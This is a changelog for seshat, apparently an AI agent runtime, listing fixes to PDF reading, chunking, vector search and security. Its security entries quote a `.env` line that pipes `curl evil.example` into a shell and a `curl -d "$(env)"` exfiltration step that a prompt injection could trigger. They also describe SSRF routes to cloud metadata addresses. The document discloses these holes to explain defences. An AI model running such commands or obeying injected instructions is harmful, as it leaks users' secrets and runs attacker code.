# Changelog

All notable changes to seshat are documented here.

Format: [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).  
Versioning: [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

---

## [Unreleased]

## [1.3.5] - 2026-10-09

### Added

- **An automation runner can carry the organization's rules, with `RunnerConfig.ManagedPolicy`.** Every agent a job's runner builds gets the same instructions and forbidden tools as an interactive client with `ClientConfig.ManagedPolicy`.

## [1.3.4] - 2026-10-09

### Added

- **A host can impose rules on every agent, with `ClientConfig.ManagedPolicy`.** It carries a text that is appended to the system prompt after everything else (a session cannot replace it) and a list of forbidden tools that are removed from what the model sees and denied by a rule that outranks every other, in every permission mode including `bypass`. It is how an organization's server (SeshatCloud) says what all its agents must or must never do. See `docs/sdk.md`.

## [1.3.3] - 2026-10-08

### Added

- **A connectivity diagnostics package, `pkg/netdiag`.** It checks one target layer by layer (DNS, TCP, TLS, HTTP), so a failure says which layer is broken; `ProbeHTTP` goes through all four, `ProbeTCP` stops at TCP for a service that does not speak HTTP. SeshatOS and SeshatCloud each carried their own copy, which had already diverged (only one had `ProbeTCP`); both will import this one.

## [1.3.2] - 2026-10-08

### Added

- **The Google Drive connector can talk to another server.** `GDriveConnector.WithEndpoint` replaces the Drive API base URL, so the connector can be tested end to end against a fake or recorded Drive, or run behind a Google-compatible proxy. Without it nothing changes: the connector still talks to Google.

## [1.3.1] - 2026-10-07

### Changed

- **The docs say what the code does.** `docs/memory.md` names the memory tools that exist (`memory_create_entities`, `memory_add_observations`, `memory_search_nodes`, `memory_open_nodes`) and the real compaction settings (85% of the usable window, about 50% afterwards, `ClientConfig.AutoCompact`); `docs/sdk.md` has the current hook API (`HookEventPreToolUse`, a handler that takes a `HookProgress`, `HookRegistry().Remove`); `docs/team.md` says that teams are internal packages not exposed through the CLI, the SDK or gRPC; `docs/rag.md` describes the three RAG tools and the `RAG_EMBEDDING_*` variables instead of a `seshat rag` command and a `RAGConfig` that do not exist. `docs/providers.md` is regenerated: new models and limits, the Kimi provider, and the environment variable of Codex, Foundry, Workers AI and OpenCode, which `scripts/gen_provider_docs.go` left blank because it read them only from provider discovery; it falls back to the credential variables of the configuration now.

### Changed

- **A function can no longer grow past a cyclomatic complexity of 30.** 37 functions already did (counted as `gocyclo` does, and the same numbers): the message switches of the terminal UI (`UI.Update` 168, `handleKeyPressMsg` 149, `handleDialogMsg` 96), and in the engine `ReadPages` (54), `RunAgent` (53), the `edit` tool (47) and a few others. `internal/archtest` lists them with their complexity: a new function above 30 fails the test, so does a listed one that gets more complex, and so does one that gets less complex until its number is lowered, so the list only shrinks. No behaviour change.

### Security

- **The `http_request` node of the workflow engine can no longer be sent to an internal address by a redirect or a DNS answer.** It checked the URL once, before the call, and then let the client follow up to 10 redirects without looking at them: a public server answering with a redirect to `http://169.254.169.254/` (or to any internal address) got the response through. It also resolved the name for the check and again to connect, so a name that answered a public address the first time and an internal one the second (DNS rebinding) got through. Every redirect is now checked against the guard (10 at most), and the address a connection is really made to is checked when it is made. The NAT64 range (`64:ff9b::/96`, which reaches IPv4 addresses through a gateway) is blocked too. The node connects directly and ignores the proxy variables of the environment, which would hide the destination from both checks.

### Changed

- **The documentation points to the website, and `SECURITY.md` says what the gRPC server does now.** The README header, the installation, quick start, CLI, gRPC and Go SDK sections, `docs/README.md`, `CONTRIBUTING.md` and the `pkg/sdk` package comment link to the pages of seshat-ai.com that cover them (installation, configuration, the SDK, the gRPC API, security and trust), with the canonical `/en/` addresses. `SECURITY.md` still said that the gRPC server had no authentication layer; it now describes the loopback default, the token, TLS, the stdio MCP switch, the environment of commands and the trust of a project.
- **The permission resolver is split into steps.** `Integrator.ResolverWithContext` was one closure of 270 lines (cyclomatic complexity 52). Looking up what the session or the turn already granted, recording an approval, reading the user's answer and its refusal reason are now `sessionAllows`, `recordApproval`, `promptApproval` and `promptDenyReason`. The behaviour is unchanged (the existing resolver tests pass untouched); the two pure helpers get their own tests.
- **Every exported symbol of `pkg/` has a doc comment, and the test is strict.** The 511 that had none (680 before the generated protobuf code was left out, as linters do) are written: the facades (`pkg/sdk`, `pkg/rag`, `pkg/automation`, `pkg/types`, `pkg/skills`, `pkg/storage`, `pkg/mcp`...) say what they re-export, and `pkg/workflow`, `pkg/dataflow`, `pkg/connectors`, `pkg/msgraph`, `pkg/config`, `pkg/doctor`, `pkg/runtimepath` and the others describe their own behaviour, read from the code. `internal/archtest` fails on any new undocumented exported symbol; the tolerance list it used to hold is gone. No behaviour change.

### Fixed

- **A PDF's page count was always 0, and PDF reads now stop with their context.** `ReadPDF` and `GetPDFPageCount` took the count from `pdfcpu.Read`, which leaves it at 0 (checked on pdfcpu 0.13 and 0.16): the "too many pages to read at once" check of the fallback readers never fired and a very large PDF went through whole as base64. The count comes from `api.PageCount` now. `ReadPDF`, `GetPDFPageCount`, `ExtractPDFPages`, the page reader and the decryption of an encrypted PDF take the context of the read (they handed pdfcpu a `context.Background()`), so a cancelled read stops parsing; `pkg/pdfsmart` keeps `Unlock` and gains `UnlockContext`. The local storage provider and the loading of MCP skills use the caller's context too.
- **A connection that sent an MCP notification over HTTP is given back to the pool, and `bodyclose` checks it.** `HTTPTransport.SendNotification` discarded the response without reading or closing its body, so every notification held a socket open. The body is read (up to 64 KiB) and closed. The other 25 findings of the linter were a function that returned a response whose body it had already closed (`spGraphClient.get` now returns only the error), two cases that are not leaks (the response returned to the caller in the retry wrapper, the handshake response of a websocket) with the reason on the line, and the tests, which now close what they receive.
- **Wrapped errors are recognised, and `errorlint` checks it.** 59 places compared an error with `==`/`!=` (`io.EOF`, `sql.ErrNoRows`, `context.Canceled`...), read it with a type assertion (`*exec.ExitError`, `*types.EngineError`, the circuit-breaker and permission errors) or wrapped it with `%v`; a wrapped error was then missed. The retry and recovery classification in the engine, the exit-code reading of commands and hooks, and the end-of-input handling now use `errors.Is` and `errors.As`, and the messages that hide their cause use `%w`. The linter is on, so a new one fails the build.

## [1.3.0] - 2026-10-06

### Security

- **The web fetch guard against requests to the local network refuses more.** It already refused loopback, private, link-local and unspecified addresses; a test of 28 ways of writing a local target found that these still went through: `100.64.0.0/10` (carrier-grade NAT, where Alibaba Cloud serves its metadata endpoint at `100.100.100.200`), `0.0.0.0/8`, the broadcast address, multicast beyond link-local, an IPv4 address embedded in a NAT64 address (`64:ff9b::7f00:1` reaches `127.0.0.1`), and the names `localhost.` and `metadata.google.internal.` with a root dot (refused by the name check only after the name was resolved, not before). They are refused now, before and after DNS resolution. The check is used by `web_fetch` only.
- **The terminal UI no longer applies the executable parts of a project's configuration until the project is trusted.** `.seshat.json`, `seshat.json` (from the working directory up to the git root) and `.seshat/seshat.json` are merged into the configuration, and a repository that was just cloned can carry any of them: a test loads one with an MCP server in stdio mode, a hook, an LSP server, a provider with a `base_url` and an `api_key` written `$(...)`, `permissions.allowed_tools` and extra context paths, and all of it was applied, so opening Seshat in the folder started the command (nothing asked). Now `mcp`/`mcpServers`, `hooks`, `lsp`, `providers`, `permissions`, `image_generation`, `text_to_speech`, `speech_to_text`, `options.context_paths` and `options.skills_paths` of a project file are ignored unless the user ran **`seshat trust`** in the project (`--status` to see, `--untrust` to withdraw). The trust is recorded for the SHA-256 of each file, so a file that changes has to be trusted again; a setting changed through the interface keeps a trusted file trusted and does not trust a file that came with the repository. The interface warns at startup when something was ignored. The user's own configuration, in the runtime root, is never restricted. See `docs/project-trust.md`.
- **A `.env` file in the working directory can no longer run a command or redirect Seshat.** `Load` reads `.env` from the directory Seshat is started in, which can be a repository that was just cloned, and `ExpandShellValues` runs any `$(...)` found in the configuration: a `.env` holding `SESHAT_API_KEY=$(curl evil.example | sh)` ran that command when the configuration was loaded, before any prompt (shown by a test that makes the command write a file). A `.env` entry is now ignored, with a warning on the standard error output, when its value holds a shell substitution (`$(...)` or a backquote) or when its name is one that decides what is run or where Seshat looks for its configuration or how closed its commands are: `PATH`, `SHELL`, `HOME`, `LD_*`, `DYLD_*`, `GIT_*`, `PYTHON*`, `PERL*`, `NODE_OPTIONS`, `BASH_ENV`, `EDITOR`, `NPM_CONFIG_*`, `SESHAT_RUNTIME_ROOT`, `SESHAT_BASH_*`, `SESHAT_GRPC_ALLOW_*`, `SESHAT_GRPC_AUTH_*` and `SESHAT_GRPC_TLS_*`. They still work from the real environment and from the user's own configuration file. Keys, models and URLs in a `.env` are unchanged. Found by triaging the `gosec` report.
- **A `HEAD` file can no longer make `ReadGitHead` read another file.** The ref named by `ref: ...` was joined to the git directory without a check, so `ref: refs/heads/../../../secret` made the first line of any file readable as a commit id. A ref must now be a name under `refs/` (no `..`, no absolute path, no backslash or drive letter) and is read through `os.Root`. The two walks that read files found on the way (the validator of skills and the search of office files in a session directory) read them through `os.Root` too and skip symlinks.
- **`gosec` blocks the build on a new finding of high severity** (medium confidence or better), pinned to v2.29.0, and `govulncheck` is pinned to v1.8.0 (they were `@master` and `@latest`). The `gosec` step was in fact analysing nothing: the Docker action ships a Go older than the 1.26.6 of `go.mod`, could not load a single package and reported "Issues: 0", which the report-only mode hid; it is now built and run with the Go of the job, and a failure to load packages fails the step. Of the 75 high-severity findings of the first scan, 10 were fixed or accepted one by one with a `#nosec <rule> -- reason` on the line (three goroutines that outlive their request on purpose, the hook and `$(...)` commands that come from the user's own configuration, two reads in the worktree resolution of `.git`), and four classes judged false positives for this code base are excluded in the workflow with the reason of each (`G101`, `G404`, `G115`, `G704`).
- **A command the model runs no longer inherits the secrets of the process.** The `bash` tool (foreground, background and `monitor`), the local sandbox executor and the shell of the terminal UI gave every command the whole environment of Seshat, provider keys, database and cloud credentials included, so `env`, or `curl -d "$(env)" ...` obeying an instruction hidden in a web page, a tool result or a file of the repository, could send them out. The new `internal/envfilter` takes out the variables whose name says secret (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `*_DSN`, `DATABASE_URL`...), the families of the providers Seshat talks to and the ones whose value is plainly a credential (a URL with a password, a private key, the usual token prefixes); `PATH`, `HOME`, the locale, the proxies and the build settings stay (`SSH_AUTH_SOCK` too, for git over SSH). `SESHAT_BASH_ENV_ALLOW=NAME,PREFIX_*` keeps variables that look like secrets (a command that needs `GITHUB_TOKEN`), `SESHAT_BASH_INHERIT_ENV=true` restores the old behaviour. The Docker sandbox never forwarded the environment. Variables given by a call itself still pass. Found in an audit of the repository.
- **`cmd/grpc` is closed by default.** It listened on every interface (`:50051`), with no authentication and no TLS, and `ConnectMCP` took a `command`, `args` and `env` and started that process on the host (and saved it in the user's MCP configuration, so it came back at the next start): anyone who could reach the port could run commands as the user of the server, and spend its provider keys through `Query`. Now: it listens on `127.0.0.1` unless `SESHAT_GRPC_HOST` says otherwise; on any other address it refuses to start without `SESHAT_GRPC_AUTH_TOKEN` (or `SESHAT_GRPC_ALLOW_INSECURE_REMOTE=true`); with a token, every call but `HealthCheck` needs `authorization: Bearer <token>` (compared in constant time); `SESHAT_GRPC_TLS_CERT` and `SESHAT_GRPC_TLS_KEY` turn TLS on; and `ConnectMCP` refuses a stdio server (`PermissionDenied`) unless `SESHAT_GRPC_ALLOW_STDIO_MCP=true`. **Breaking for a deployment that reached the server from outside its host or container**: set `SESHAT_GRPC_HOST=0.0.0.0` and a token (see `docs/transports.md`); one that calls `ConnectMCP` with a stdio server must set `SESHAT_GRPC_ALLOW_STDIO_MCP=true`. Found in an audit of the repository.

### Changed

- **The terminal notifications show the seshat logo.** The two embedded notification icons were a pixel heart unrelated to seshat; they are now the runtime logo (the rosette in a terminal window) as 512 px PNG files with a transparent background, which operating-system notifications need (they do not display SVG). The file names are unchanged.
- **The runtime logo is in `docs/brand`.** Every form of it (light, dark, black and white, icons, favicon) as SVG files without a background, with a short README, and the README header uses them with light and dark variants instead of the generic stock icon.
- **`internal/db` has tests.** The shared database layer (14 files: connection, migrations, credentials) had none. They now check that a bad config is refused, that migrations are recorded and not applied twice when a file is reopened, that a credential is stored encrypted (AES-256-GCM) and comes back unchanged, and that a tampered or foreign ciphertext is refused. No behaviour change.
- **The doc-comment rule of `pkg/` is checked.** `AGENTS.md` asks for a doc comment on every public type, but 680 exported functions, methods and types of `pkg/` have none. `internal/archtest` counts them per package: a new undocumented exported symbol fails the test, and so does a lower count until the number is lowered in the test, so the backlog can only shrink. No behaviour change.
- **The engine no longer prints diagnostics on the standard output.** A failing hook in the agent runner, a hook that asked to stop and a full hook-lifecycle channel were written with `fmt.Printf`; embedded in a gRPC server, over MCP stdio or through the SDK, that text lands in the host's own output. They go through `log/slog` now. `internal/archtest` fails on a new `fmt.Print*` in `internal/` outside the interactive prompts (login, console question, console sink) and the terminal UI.
- **The git and docker commands of the engine stop with their context.** The diff that `edit` and `write` compute, and the worktree commands (`enter_worktree`, `exit_worktree`, sub-agents in a worktree), ran `git` with `exec.Command`, so cancelling the call left the process running; they now take the context of the call (`shared.ComputeGitDiff`, `WorktreeManager.RemoveWorktree` and `CountWorktreeChanges` gain a `ctx` parameter). The cleanup of a sub-agent's worktree keeps running when the agent was cancelled (`context.WithoutCancel`). Where there is no caller context, the command is bounded instead: the cached branch and remote lookups of the interface 5 s, `docker stop` 30 s, the `seshat doctor` probes 10 s.
- **Speech, image and document-download requests have a timeout.** The OpenAI speech-to-text and text-to-speech clients, the OpenAI and Gemini image clients and the URL download of the native document converter used an `http.Client` with no timeout, so a provider that stopped answering held the call for ever. They now give up after 5 minutes (a transcription or a generation can take minutes); the context of the caller still cancels earlier. Streaming clients (model providers, MCP) and model downloads keep no overall timeout on purpose.
- **A web search can be cancelled, and `noctx` checks it.** The generic HTTP search provider and the SearXNG client built their requests without the context of the caller (`searxng.SearchInput` now has a `Ctx`, as `providers.SearchInput` already did), so cancelling a search left the request running. `fetch.FetchWithRedirect`, an unused function that did the same, is removed (`Service.doRequest` is the live path). The `noctx` linter is on, so a request without a context fails the build.
- **`nolintlint` is on in the linter.** `AGENTS.md` forbids a `//nolint` without a reason; now `golangci-lint` rejects one with no explanation, with no named linter, or that no longer suppresses anything. Ten existing directives got their reason and eight that suppressed nothing were removed.
- **The rule "`internal/` never imports `pkg/`" is now checked.** `AGENTS.md` stated it, but 46 imports in 36 files already broke it and nothing noticed. `internal/archtest` lists those as known and fails on any new import of `pkg/` from `internal/`, and on a listed one that is gone, so the list can only shrink. No behaviour change.
- **A `.env` that points a service to a remote server now says so.** A `*_BASE_URL`, `RAG_EMBEDDING_URL`, `RAG_RERANK_URL`, `SESHAT_S3_ENDPOINT` or `SEARXNG_BASE_URL` entry whose host is not local (localhost, loopback, private address) is still applied, with a warning on the standard error output naming the server that gets the requests and their API key. It is a warning and not a block because a remote gateway is a normal setup.
- **The gRPC contract says what it is.** `seshat.proto` no longer declares `FileService` and `SystemService` (with its `Bash` RPC): they were never implemented in `cmd/grpc` and nothing in the repository used them, so a client generated from the file got stubs that always failed. `QueryRequest.stream` and `QueryRequest.temperature` are marked `deprecated` (the server ignores both). The file now states that the surface is experimental and partial (`SeshatService` only: `Query`, `QueryStream`, `ConnectMCP`, `GetModels`, `HealthCheck`). Generated code regenerated with protoc 34.1, protoc-gen-go v1.36.11 and protoc-gen-go-grpc v1.6.1.
- **The reranker is not asked when the first stage is sure** (`Service.SetRerankMargin`, `RAG_RERANK_MARGIN`, 0.2 by default; 0 asks it for every search): when the best chunk beats the second by at least that share of its own score, the retrieval order stands. On the SeshatCloud benchmark this lost nothing (MRR 0.902 with and without on the 192 single-fact questions, 0.421 against 0.425 on the 49 multi-passage ones) and saved 24% and 8% of the (question, chunk) pairs a cross-encoder reads. Deeper savings (a pool of 5, a margin of 0.05 to 0.1, cheap lexical features) did not hold on the multi-passage questions and are not used. With no reranker configured nothing changes.
- **Reranking defaults, measured** (retrieval benchmark of SeshatCloud: 192 questions on 19 documents, bge-m3 + BM25 as first stage, three cross-encoders; see `docs/rag.md`). The blend weight stays at 0.7, and now with a measure behind it: the best weight depends on the reranker (0.5 for the small mMARCO MiniLM 118M and bge-reranker-base 278M, where the reranker alone gained nothing; indifferent for bge-reranker-v2-m3; 1.0 for Cohere rerank-v3.5), and against the best weight of each of the five rerankers measured 0.7 never loses more than 0.012 of MRR, where 0.5 loses up to 0.019 and 1.0 up to 0.020. The pool is `max(topK, 10)` chunks instead of `max(3 x topK, 20)`: 20 was not better than 10 for any model and costs twice the time. The reranker is now asked for the whole pool and its scores are normalised over the whole pool, then the list is cut to `topK` (it was asked for `topK` only, so the normalisation, and with it the blend, depended on which few chunks came back). bge-reranker-v2-m3 moves the answering chunk up by 0.094 of MRR [+0.054, +0.137] and hit@1 from 0.71 to 0.87; the small ones by 0.03 to 0.04.
- A reranker that fails now logs a warning ("keeping the retrieval order") instead of falling back silently.

### Fixed

- **A command that ends at once no longer loses its whole output.** The `bash` tool read the stdout and stderr pipes in goroutines while it called `cmd.Wait()`, and `Wait` closes those pipes; when the command finished before the readers had read, the model got an empty result (exit code 0, stdout and stderr empty). Measured on Linux with the CPU limited to 0.3: 6 of 1,600 `echo` commands lost everything; after the change, 0 of 2,400. The streams are now handed to `exec` as writers, so `Wait` returns only when the copies are done, and the chunk callback is unchanged. This was also the cause of `TestExecuteCommandDoesNotPrintTheSecretsOfTheProcess` failing now and then in CI.

## [1.2.73] - 2026-10-05

### Changed

- **The HNSW store has its own graph** (`internal/vector/hnsw_index.go`), in place of `github.com/coder/hnsw`. That library stops its search as soon as a step finds nothing closer, so `efSearch` only bounded a queue and the search was greedy: measured against an exact search it found 8% of the true ten nearest neighbours of 2,000 random vectors and 2% of 20,000, whatever `efSearch` (20 to 200) and `M` (16 or 32), and 35% / 17% on clustered vectors. The new graph is the algorithm of the paper (search until no candidate is closer than the worst of the `efSearch` best, neighbours chosen for their spread): 1.00 on clustered vectors and 0.99 on random ones at 3,000 vectors, 0.998 on 20,000 clustered ones (0.63 on 20,000 random ones with `efSearch` 64, 0.91 with 512, the hardest case: random vectors have no structure to follow). A removed or replaced vector is a tombstone until more than half the graph is tombstones, then the graph is rebuilt. A metadata filter on a search now asks the graph for five times more hits, so that some are left after the filter.
- **The HNSW store works on Windows** (the old library did not build there): `vector.StoreHNSW` and the CLI use it. An install that ran before, with its corpus in the SQLite fallback file and no HNSW file, keeps using SQLite until that file is emptied, so its corpus is still read.
- A graph file written by an older version (the `coder/hnsw` format) is read once, rebuilt from its vectors in the new format, and kept as `<namespace>.hnsw.legacy` (Linux and macOS; on Windows no such file exists).
- **Qdrant and Chroma honour `HybridWeight`** (they ignored it). Neither can rank by words, so the keyword side is one lookup per word of the query (16 at most, run together): a document scores the sum of the weights of the query words it holds, a rarer word weighing more, and the result is blended with the vector hits as in every other store. Qdrant creates a full text index on `_text` for the collection on the first hybrid search; Chroma matches each word with a case-insensitive whole-word regular expression, which it evaluates on every document of the collection, so its keyword side costs a scan per word.
- **pgvector**: a query for more than 40 vector candidates (every hybrid search) runs with `hnsw.ef_search` raised to the number asked, up to 1000: an HNSW index returned at most 40 rows whatever the `LIMIT`. On 20,000 random vectors this took the hybrid hit rate of the store from 0.21 to 0.42.

### Added

- `TestStoreSpeed` (`internal/vector/speed_test.go`, runs only with `VECTOR_SPEED=1`): ingestion time, median and 95th percentile latency of a vector and of a hybrid search, and hit rate, for every store on the same synthetic collection. Integration tests of the hybrid search for Qdrant (`QDRANT_INTEGRATION_ADDR`) and Chroma (`CHROMA_INTEGRATION_URL`).

### Fixed

- **pgvector**: a search with a metadata filter failed (`could not determine data type of parameter`): the placeholders of the filter were numbered one too high. The pgvector tests had never run in CI (they skip without a database); the Test job now starts a `pgvector/pgvector:pg17` service, and a new test covers the hybrid search on a real database (words only the keyword side matches, the filter on both sides, the `text_search` index, a table created before the column existed).
- `TestDockerExecutorCloseRemovesContainers` waits for the removal (up to 30 s) instead of checking at once: `docker stop` returns before `--rm` has removed the container, and on a busy machine the test failed.

## [1.2.72] - 2026-10-05

### Changed

- Hybrid search blends the same way in every vector store, and finds what only the words match. The stores read `topK` or `2 x topK` hits of each ranking and blended the vector ones with keyword scores that were not normalised (pgvector added a raw `ts_rank` to a cosine; SQLite and HNSW only boosted hits the vectors had already found; the memory store ignored the weight). Each ranking is now read to `max(100, 10 x topK)` candidates (500 at most), divided by its best score, weighted `1 - HybridWeight` and `HybridWeight` and added (`blendHybrid`), so a chunk the vectors rank far down but the words match is found. Measured on the SeshatOS retrieval benchmark (192 questions, 19 documents, bge-m3): 100 candidates instead of 20 find the answer among the first five results 3 to 4 points more often at 512 and 768 token chunks, and blending scores instead of ranks adds 0.04 to 0.05 of MRR there. No change at 256 token chunks, and none on the 49 questions that need several passages; how the scores are normalised (best score, min-max, z-score) made no difference beyond the noise.
- **pgvector**: the keyword side reads a `text_search` column, a `tsvector` the database keeps from `text` (PostgreSQL 12 or later, added to an existing table on startup), with a GIN index, instead of parsing the text of every row of the collection at each query, and joins the words of the query by OR. `PgVectorOptions.TextSearchConfig` chooses the text search configuration (`simple` by default). A failing keyword query is an error: it fell back to a pure vector search without a word.
- The memory store honours `HybridWeight` (it ignored it). Chroma and Qdrant still ignore it; `vector.Query` says so.

### Added

- `TestDumpChunksForEvaluation` accepts `heading<N>o<M>` as a strategy name: chunks of N tokens with an overlap of M (`heading512o0`: none), to measure what an overlap is worth.

## [1.2.71] - 2026-10-05

### Fixed

- A table whose rules between columns are drawn only in its heading no longer writes the same text in each of the columns of a merged cell. The FOMC projections draw the rules between 2024, 2025 and 2026 in the band of the years and none in the body, so the three figures of a row ("2.1 2.0 2.0") were one wide cell, written three times. A ruling that does not cover a row now still separates two cells of it when the cell it would merge holds text on both sides of it and none runs across; a single block of text over the ruling stays a merged cell. In a table whose rows are not bounded by rules, the second line of a heading over a column of figures ("Longer" over "run") carries on the first, since no column is a column of figures above the first row that has one (a year is not a figure).

## [1.2.70] - 2026-10-04

### Fixed

- A page of a PDF that is shown rotated (`/Rotate 90`, `180` or `270`, a landscape table in a portrait document) is read in the orientation it is shown in. Its text, drawn through a rotated matrix, came out with a size and an advance of zero and one glyph per line ("F", "o", "r", ...: 782 lines of one letter in the FOMC projections, 1286 paragraphs for 59 once read properly); the rulings are turned too, so a rotated table is found as a table. The size and the advance of each glyph are restored from the font's width table, or from the proportions of Helvetica when the file has none.
- A paper set in two columns is read as paragraphs. The right edge of the text was one number for the whole page, so each line of the left column "stopped far short of the edge" and was taken for a list of short lines: every line kept its break and a word hyphenated at a line end was never joined (BERT: 156 hyphens at line ends and 474 line breaks inside paragraphs, now 31 and 92). Pages with two columns now have a margin and an edge per column.
- A word broken at a line end keeps its hyphen when the page writes it that way elsewhere ("task-specific", "pre-trained"), and has no hyphen otherwise ("approximation"). A compound broken at its own hyphen ("English-" then "to-German") no longer gets a space after it.
- Ligatures are not lost any more. A font that names its ligature glyphs by their parts (`f_i`, `f_f_i`, `f_l`: Linux Libertine, most fonts made with FontForge) gave a control character that was dropped, so "files" was read as "les", "financial" as "nancial" and "efficiency" as "ecency" (132 in the LayoutLM paper); the names are read from the font and written as letters. The ligature characters of Unicode (U+FB00 to U+FB06, "ﬁ", "ﬂ") are written as the letters they stand for, since "ﬁne-tuning" is not found by a search for "fine-tuning".
- The control characters of a symbol font (bullets and check marks with no Unicode value, 232 in an IBM Redpaper) are dropped from the text.

## [1.2.69] - 2026-10-04

### Fixed

- A PDF page with no text at all (a cover, a blank page, a full-page picture) no longer makes the whole document unreadable when no engine and no vision model is configured: one such page failed 3 of the 13 PDFs of the chunking benchmark corpus (a book of 60 pages, a deck of 25, a report of 18). The page is kept as it is, with a marker for each picture it holds (`[Image 1 on page 7]`), or empty when it holds none. A PDF none of whose pages has text (a scan) is still "nothing extracted", and so is any document when an engine is configured and does not answer: that must not leave a hole nobody sees.

## [1.2.68] - 2026-10-04

### Added

- `rag.HeadingChunker` and `rag.NewHeadingChunker` in the public SDK (`pkg/rag`): the markdown chunker hosts use for documents they read natively (headings, paragraphs, lists, tables and code cut along their structure, `heading_path` and `page_numbers` metadata) can be used directly, without going through `NewHybridDocumentChunkerForProfile` and its fallback.
- `TestDumpChunksForEvaluation` (`internal/rag`, does nothing unless `MD_DIR`, `DOCS`, `STRATS` and `OUT` are set): writes the chunks of markdown documents for the retrieval benchmark of seshat-intelligence (`benchmarks/chunk_bench` in SeshatOS), which asks whether the chunk that answers a question is among the first results. `STRATS` names the chunkers (`profile` for the default structured profile, `paragraph`, `heading<N>` for chunks of N tokens); `LABEL` is put before each name to tell the chunks of an older checkout from these.

### Fixed

- A PDF page that has text and a picture is read when no engine or OCR is there to read the picture, instead of failing the whole document. `pdfsmart.Convert` sent every page with a raster image to the engine, so with none configured a paper with a single figure was "nothing extracted" (11 of 13 PDFs of the chunking benchmark corpus). The page keeps its text, and ends with a marker for each picture worth one: `[Image 2 on page 4: Figure 2. Residual learning]`, or `[Image 2 on page 4]` when no caption could be attached (a caption is attached only when the page has as many "Figure N" lines as pictures). Icons under 100 pixels and a picture used on three pages or more (a logo, a letterhead) get no marker. The number counts the pictures of the page, so with the page number it names the picture whatever pages were read, for a host that later gives a multimodal model a way to look at the page itself. `pdfsmart.PageResult.Pictures`, `pdfsmart.Picture`, `pdfsmart.ImageMarker`. A page with no text at all (a scan) is still a failure without an engine, and a page an engine reads has no marker.

## [1.2.67] - 2026-10-04

### Added

- `documentreader.GenericConfig.ChunkFields`: a host maps the `ChunkOptions` of a chunk call (the size the chunks should have) onto the form fields its server's chunk endpoint takes. `GenericClient.ChunkHybridBytes` and `ChunkHybridFile` used to ignore the options (a server that is not docling-serve has no common names for them); without the mapping nothing changes.

## [1.2.66] - 2026-10-04

### Changed

- `HeadingChunker` and `TableChunker` read markdown as blocks (headings, paragraphs, lists, tables, fenced code) and cut it along them. Measured on 172 documents read by the native readers: chunks under 40 tokens fall from 48% to 8%, tables cut without their header from 75 of 295 to none, chunks over the limit from 123 to none, and the 2.6% of the text that was in no chunk (the items of a numbered list, taken for headings) is no longer lost. A paragraph is cut between sentences with an overlap, a table between rows with its header repeated, code between lines with each piece fenced again; small sections are joined with their headings written in the text; the heading path is clean (no `#` marks). Code comments are not headings and a numbered list is not a series of headings; Portuguese, Spanish, German, Italian and Dutch structural words are recognised. A heading with nothing under it is kept as text when no sub-heading follows it.
- The `structured` chunk profile is 512 tokens with an overlap of 64 (it was 1024 with 120): chunks of 1024 tokens held several topics.

### Added

- Chunks say which pages they come from. A PDF read page by page has, in the text that is indexed, a marker line (`<!-- page 3 -->`, an HTML comment that rendering hides) before each page: `documentreading.Result.PagedMarkdown` (and `Result.TextForIndexing()`, which gives it for a PDF and `Markdown` for every other format; `Markdown` itself stays clean for anyone who shows the text). `HeadingChunker` and `TableChunker` take the markers out of the text and put the pages a chunk covers in `Metadata["page_numbers"]` (`[3,4]`, as document readers give them); the other chunkers drop the markers. `documentreading.StripPageMarkers` for a host that needs the text clean.
- `testdata/chunking` and `TestChunkQuality`: the chunkers are held to measures (no lost word, no table piece without its header, no unbalanced fence, no chunk over the limit, few tiny chunks) on real reader output; `RAG_CHUNK_CORPUS` runs them on a bigger corpus.

## [1.2.65] - 2026-10-04

### Fixed

- Reading a long document with the layout models took minutes for nothing: on a 60-page book almost every page "looked like it might hold a table" and was put to the models, 160 s instead of 4.6 s with the same text. A page with code, formulas or two columns of running text no longer looks columnar, and the time one document may spend on the models is bounded (`pdfsmart.Options.ModelBudget`, 20 s by default, shared by every page of a document, also the pages read through the engine). `pdfsmart.Result.ModelPagesSkipped` and a note in the Read result say when pages were left without the models (their text is complete; the tables found from the rulings stay).
- A deck that is mostly pictures (a title or two of real text) gave an error, or "nothing could be read", when no reader could do better than the native extractor: its text was extracted and thrown away. `documentreading.Convert`/`ConvertBytes` and the Read tool now return that thin text (the Read tool says it is thin). A file that parsed and has no text at all is "nothing extracted", not the error of a reader that does not know the format.
- The Read tool had no size limit for converted documents (DOCX, PPTX, XLSX): a big one went into the context whole. They are now read in pieces of about 120,000 characters, with `offset`/`limit` counting lines of the markdown and a note saying where to continue.

### Removed

- Code that nothing called: `read/cancellation.go` (all but `ReadFileInRange` and `CountFileLines`), `EstimateImageTokens`, `GetImageDimensions`, `IsTextByExtension`, `IsImageByExtension`, `GetCanonicalName`, `InvalidateFileCache` and three cache methods, `pdfsmart.Result.DoclingPageCount`/`VisionPageCount`, two helpers of `officetext`, and the second plain-text layout of `pdftext` (`pdftext.Extract`, still public, now returns the markdown of the pages, as the Read tool does). The audio error no longer sends to a script that does not exist.

### Changed

- `read.DoclingExtensions` is now `read.DocumentReaderExtensions`.

## [1.2.64] - 2026-10-04

### Fixed

- Converting a whole PDF with the native reader (ingestion, and any page a caller sends to the engine) wrote a page with a text layer as the plain text of the layer, with no table at all: the tables the Read tool shows (ruled, borderless, with one rule, or a picture) were lost on that path. Such a page is now written the way the page reader writes it. A page with only a few words over a picture is still read by OCR, as before.

## [1.2.63] - 2026-10-04

### Added

- Encrypted PDFs are read. An AES-256 PDF (what Acrobat and most banks produce) or any PDF encrypted with an empty user password (an emailed statement whose owner password only limits printing and copying) used to be refused ("malformed PDF: 256-bit encryption key"); it is now decrypted into a plain copy, once, and read like any other, by every reader (the Read tool, `documentreading`, ingestion, the layout models). A PDF protected by a user password says so (`pdfsmart.ErrPasswordRequired`), and the Read tool has an optional `password` parameter for the password the user gives. Decryption is `github.com/razvandimescu/gopdf` (MIT, no dependencies; reads RC4, AES-128 and AES-256, whatever way the producer wrote the encryption dictionary) for an empty password, and `pdfcpu` when a password is given.
- `pdfsmart.Unlock`, `pdfsmart.ErrPasswordRequired` and `pdfsmart.Options.Password`.
